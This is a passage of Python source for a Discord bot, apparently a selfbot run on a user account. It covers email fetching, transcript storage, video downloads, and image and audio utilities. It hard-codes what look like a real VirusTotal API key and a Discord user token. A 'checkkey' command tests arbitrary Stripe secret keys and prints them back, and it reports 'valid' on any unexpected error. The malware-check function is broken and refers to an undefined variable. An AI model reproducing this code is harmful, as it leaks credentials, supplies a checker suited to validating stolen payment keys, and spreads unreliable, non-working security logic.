                    result, data = mail.fetch(email_id, '(RFC822)')
                    if result == 'OK':
                        email_content = data[0][1]
                        msg = message_from_bytes(email_content)
                        # Get the email topic (subject)
                        email_topic = msg['Subject']

                        # Check if the email topic matches the desired topic
                        if topic.lower() in email_topic.lower():
                            # Retrieve the email content (body)
                            if msg.is_multipart():
                                for part in msg.walk():
                                    content_type = part.get_content_type()
                                    if content_type == 'text/plain':
                                        email_text = part.get_payload(decode=True).decode()
                                        # Process the email text as per your requirements
                                        await ctx.send(f"Email Topic: {email_topic}")
                                        await ctx.send(f"Email Text:\n{email_text}")
                                        break
                            else:
                                email_text = msg.get_payload(decode=True).decode()
                                # Process the email text as per your requirements
                                await ctx.send(f"Email Topic: {email_topic}")
                                await ctx.send(f"Email Text:\n{email_text}")
                        else:
                            await ctx.send(f"No emails matching the topic '{topic}' found.")
            else:
                await ctx.send("No emails matching the criteria found.")
        else:
            await ctx.send("Failed to search for emails.")
    except Exception as e:
        await ctx.send(f"An error occurred while searching for emails: {str(e)}")

    # Close the IMAP connection
    mail.logout()

# Connect to the database
connection = sqlite3.connect('transcripts.db')
cursor = connection.cursor()

# Create a table to store transcripts
cursor.execute('''CREATE TABLE IF NOT EXISTS transcripts
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   name TEXT,
                   link TEXT)''')
connection.commit()
@bot.command()
async def tixstore(ctx, link, name):
    """Save a transcript link with a name"""
    cursor.execute('INSERT INTO transcripts (name, link) VALUES (?, ?)', (name, link))
    connection.commit()
    await ctx.send(f'Transcript "{name}" has been saved successfully!')

@bot.command()
async def gettix(ctx, name):
    """Retrieve a transcript link using its name"""
    cursor.execute('SELECT link FROM transcripts WHERE name = ?', (name,))
    result = cursor.fetchone()
    if result:
        link = result[0]
        await ctx.send(f'Transcript "{name}": {link}')
    else:
        await ctx.send(f'Transcript "{name}" not found.')
@bot.command()
async def downloadyt(ctx, url):
    try:
        yt = YouTube(url)
        video = yt.streams.filter(progressive=True, file_extension='mp4').order_by('resolution').desc().first()
        filename = video.download()  # Downloading video 

        video_file = discord.File(filename)
        await ctx.send("Here's your YouTube video:", file=video_file)

        os.remove(filename)  # Delete file after sending

    except Exception as e:
              await ctx.send(f"An error occurred: {str(e)}")
@bot.command()
async def listfilters(ctx):
    filters = ['BLUR', 'CONTOUR', 'DETAIL', 'EDGE_ENHANCE', 'EDGE_ENHANCE_MORE', 'EMBOSS', 'FIND_EDGES',
               'SHARPEN', 'SMOOTH', 'SMOOTH_MORE']
    await ctx.send("Available filters: " + ', '.join(filters))

@bot.command()
async def resizeimage(ctx, dimensions: str):
    # Check if an image is attached to the message
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image to resize.")
        return

    # Get the first attached image
    attachment = ctx.message.attachments[0]

    # Check if the attached file is an image
    if not attachment.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
        await ctx.send("Invalid image format. Please provide a PNG, JPEG, or GIF image.")
        return

    # Download the image
    response = await attachment.read()
    image = Image.open(BytesIO(response))

    # Parse the dimensions
    try:
        width, height = map(int, dimensions.split('*'))
    except ValueError:
        await ctx.send("Invalid dimensions. Please provide the width and height in the format 'width*height'.")
        return

    # Resize the image
    resized_image = image.resize((width, height))

    # Save the resized image to a BytesIO buffer
    resized_image_buffer = BytesIO()
    resized_image.save(resized_image_buffer, format='PNG')
    resized_image_buffer.seek(0)

    # Send the resized image as a response
    resized_image_file = discord.File(resized_image_buffer, filename="resized_image.png")
    await ctx.send(file=resized_image_file)
@bot.command()
async def applyfilter(ctx, filter_name: str):
    # Check if an image is attached to the message
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image to apply the filter.")
        return

    # Get the first attached image
    attachment = ctx.message.attachments[0]

    # Check if the attached file is an image
    if not attachment.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
        await ctx.send("Invalid image format. Please provide a PNG, JPEG, or GIF image.")
        return

    # Download the image
    response = await attachment.read()
    image = Image.open(BytesIO(response))

    # Apply the filter
    filter_name = filter_name.upper()
    if hasattr(ImageFilter, filter_name):
        filtered_image = image.filter(getattr(ImageFilter, filter_name))
    else:
        await ctx.send("Invalid filter name. Use `.listfilters` to see available filters.")
        return

    # Save the filtered image to a BytesIO buffer
    filtered_image_buffer = BytesIO()
    filtered_image.save(filtered_image_buffer, format='PNG')
    filtered_image_buffer.seek(0)

    # Send the filtered image as a response
    filtered_image_file = discord.File(filtered_image_buffer, filename="filtered_image.png")
    await ctx.send(file=filtered_image_file)
@bot.command()
async def extractaudio(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("You must attach a video.")
        return

    attachment_url = ctx.message.attachments[0].url
    response = requests.get(attachment_url)

    with open("temp.mp4", "wb") as temp:
        temp.write(response.content)

    video = VideoFileClip("temp.mp4")
    video.audio.write_audiofile("audio.mp3")

    audio = AudioSegment.from_mp3("audio.mp3")
    audio.export("audio.wav", format="wav")

    await ctx.send(file=discord.File("audio.wav"))
      

async def check_file_for_malware(file_url):
    headers = {
        "x-apikey": '2dbbdf746c1f3934e3c2cfeacd175eb468deb398206ca8c776fbe4b37a6c780e'
    }
    data = {
        "url": file_url
    }

    async with aiohttp.ClientSession() as session:
        async with session.post('https://www.virustotal.com/api/v3/urls', headers=headers, json=data) as response:
            analysis_id = (await response.json())['data']['id']
    malicious = result['data']['attributes']['stats']['malicious']
    return malicious > 0
@bot.command()
async def checkkey(ctx):
    # Get the Stripe API key from the command argument
    api_key = ctx.message.content.split(' ')[1]

    # Set the API key for Stripe
    stripe.api_key = api_key

    try:
        # Attempt to make a test API request
        response = stripe.Account.list(limit=1)

        if response['object'] == 'list' and response['data']:
            await ctx.send(f"The API key '{api_key}' is valid!")
        else:
            await ctx.send(f"The API key '{api_key}' is invalid!")
    except stripe.error.AuthenticationError:
        await ctx.send('Invalid API key!')
    except Exception as e:
        await ctx.send(f'The Api is valid')

# Dictionary to store rate limit information
http_session = aiohttp.ClientSession()
@bot.command()
async def change_hypesquad(ctx):
    choices = {
        1: "Bravery",
        2: "Brilliance",
        3: "Balance"
    }
    
    await ctx.send("[1] Bravery\n[2] Brilliance\n[3] Balance")
    await ctx.send("Enter your choice (1, 2, or 3):")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        msg = await bot.wait_for('message', check=check, timeout=30.0)
        choice = int(msg.content)
    except asyncio.TimeoutError:
        await ctx.send("Command timed out. Please try again.")
        return
    except ValueError:
        await ctx.send("Invalid choice. Please enter a number (1, 2, or 3).")
        return
    
    token = "NTE2Mzg5NTk5OTE2OTgyMjcy.GCZdH7.WUk9LxZ8150p5EqCBTydUPweH85S22gDVfX2Ws"  # Replace with your token
    
    headerpost = {
        'Authorization': token
    }
    
    payloadsosat = {
        'house_id': choice
    }
    
    try:
        await ctx.send(f"Changing Hype Squad to {choices.get(choice, 'Unknown')}")
        
        async with http_session.post("https://discord.com/api/v8/hypesquad/online", json=payloadsosat, headers=headerpost) as response:
            if response.status == 204:
                await ctx.send("Hype Squad changed successfully!")
            elif response.status == 401:
                await ctx.send("Token is invalid or expired!")
            elif response.status == 429:
                await ctx.send("Too many requests. Please try again later!")
            else:
                await ctx.send("An error occurred while changing Hype Squad. Please try again!")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")


token = os.getenv('token')
bot.run(token, bot=False)